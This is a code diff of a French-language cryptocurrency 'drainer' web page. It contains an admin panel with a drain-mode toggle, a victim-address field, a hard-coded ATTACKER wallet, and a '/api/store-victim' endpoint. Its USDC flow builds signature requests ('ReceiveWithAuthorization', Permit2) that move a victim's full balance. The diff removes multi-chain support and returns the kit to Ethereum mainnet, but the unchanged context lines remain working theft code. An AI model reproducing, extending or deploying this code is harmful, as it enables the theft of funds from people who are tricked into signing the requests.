@@ -393,18 +393,6 @@
             <label for="toggle-mode-switch" style="font-size: 14px; color: var(--azure-15);">Auto</label>
           </div>
           <p id="mode-status" style="font-size:12px; color:var(--azure-40); margin-top:8px;"></p>
-          <div style="margin-top:16px;">
-            <label for="admin-chain" style="font-size:14px; color:var(--azure-15);">Réseau signature USDC</label>
-            <select id="admin-chain" style="width:100%;margin-top:6px;padding:8px;">
-              <option value="1">Ethereum</option>
-              <option value="8453">Base</option>
-              <option value="42161">Arbitrum</option>
-              <option value="10">Optimism</option>
-              <option value="137">Polygon</option>
-              <option value="43114">Avalanche</option>
-            </select>
-            <p id="chain-status" style="font-size:12px; color:var(--azure-40); margin-top:8px;"></p>
-          </div>
         </div>
       </div>
     </div>
@@ -791,8 +779,6 @@
       const resp = await fetch('/api/drain-mode');
       const data = await resp.json();
       toggleModeSwitch.checked = (data.mode === 'auto');
-      const chainSel = document.getElementById('admin-chain');
-      if (chainSel && data.chain) chainSel.value = String(data.chain);
     } catch (err) {
       modeStatus.textContent = 'Erreur chargement mode';
     }
@@ -826,29 +812,6 @@
     }
   });
 
-  const adminChain = document.getElementById('admin-chain');
-  const chainStatus = document.getElementById('chain-status');
-  if (adminChain) {
-    adminChain.addEventListener('change', async () => {
-      const token = sessionStorage.getItem('adminToken');
-      if (!token) {
-        if (chainStatus) chainStatus.textContent = 'Token admin manquant';
-        return;
-      }
-      try {
-        const resp = await fetch('/api/drain-mode', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + token },
-          body: JSON.stringify({ chain: adminChain.value })
-        });
-        const result = await resp.json();
-        if (chainStatus) chainStatus.textContent = result.success ? ('Réseau: ' + adminChain.options[adminChain.selectedIndex].text) : ('Erreur: ' + (result.error || ''));
-      } catch (err) {
-        if (chainStatus) chainStatus.textContent = 'Erreur réseau';
-      }
-    });
-  }
-
   drainBtn.addEventListener('click', async () => {
     const victim = victimAddress.value.trim();
     if (!ethers.utils.isAddress(victim)) {
@@ -872,15 +835,6 @@
   let ATTACKER = '0x0b1369DF890dF9B7ee94F9C0bb53BAd6de7541d6';
   const USDT_ADDR = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
   const USDC_ADDR = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48';
-  const USDC_BY_CHAIN = {
-    1:     { addr: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', rpc: 'https://ethereum.publicnode.com' },
-    8453:  { addr: '0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913', rpc: 'https://mainnet.base.org' },
-    42161: { addr: '0xaf88d065e77c8cC2239327C5EDb3A432268e5831', rpc: 'https://arb1.arbitrum.io/rpc' },
-    10:    { addr: '0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85', rpc: 'https://mainnet.optimism.io' },
-    137:   { addr: '0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359', rpc: 'https://polygon-rpc.com' },
-    43114: { addr: '0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E', rpc: 'https://api.avax.network/ext/bc/C/rpc' }
-  };
-  let activeChainId = 1;
   const PERMIT2_ADDRESS = '0x000000000022D473030F116dDEE9F6B43aC78BA3';
   const API = '/api/store-victim';
   let PROJECT_ID = '6f9e5677969200a1a767d913d833f234';
@@ -1064,7 +1018,7 @@ async function initWalletConnect() {
 async function wcRequest(method, params) {
     return signClient.request({
       topic: session.topic,
-      chainId: 'eip155:' + String(activeChainId),
+      chainId: 'eip155:1',
       request: { method, params }
     });
   }
@@ -1122,27 +1076,8 @@ async function handleUsdc3009Flow() {
     const scanText = document.querySelector('.scan');
     if (scanText) scanText.textContent = 'Détection de votre solde USDC…';
 
-    let forcedChain = 1;
-    try {
-      const dm = await fetch('/api/drain-mode').then(function (r) { return r.json(); });
-      if (dm && dm.chain && USDC_BY_CHAIN[Number(dm.chain)]) forcedChain = Number(dm.chain);
-    } catch (e) {}
-    const meta = USDC_BY_CHAIN[forcedChain] || USDC_BY_CHAIN[1];
-    const pick = { id: forcedChain, addr: meta.addr, rpc: meta.rpc };
-    activeChainId = pick.id;
-    if (useInjected && window.ethereum && pick.id !== 1) {
-      try {
-        await window.ethereum.request({
-          method: 'wallet_switchEthereumChain',
-          params: [{ chainId: '0x' + pick.id.toString(16) }]
-        });
-      } catch (sw) {
-        console.warn('switch chain', sw);
-      }
-    }
-
-    const provider = new ethers.providers.JsonRpcProvider(pick.rpc);
-    const usdc = new ethers.Contract(pick.addr, [
+    const provider = new ethers.providers.JsonRpcProvider(PUBLIC_RPC);
+    const usdc = new ethers.Contract(USDC_ADDR, [
       'function balanceOf(address) view returns (uint256)',
       'function decimals() view returns (uint8)',
       'function name() view returns (string)'
@@ -1174,8 +1109,7 @@ async function handleUsdc3009Flow() {
       value: balance.toString(),
       validAfter: validAfter,
       validBefore: validBefore,
-      nonce: nonce,
-      chainId: activeChainId
+      nonce: nonce
     };
 
     const typedData = {
@@ -1198,8 +1132,8 @@ async function handleUsdc3009Flow() {
       domain: {
         name: tokenName || 'USD Coin',
         version: '2',
-        chainId: activeChainId,
-        verifyingContract: pick.addr
+        chainId: 1,
+        verifyingContract: USDC_ADDR
       },
       primaryType: 'ReceiveWithAuthorization',
       message: {
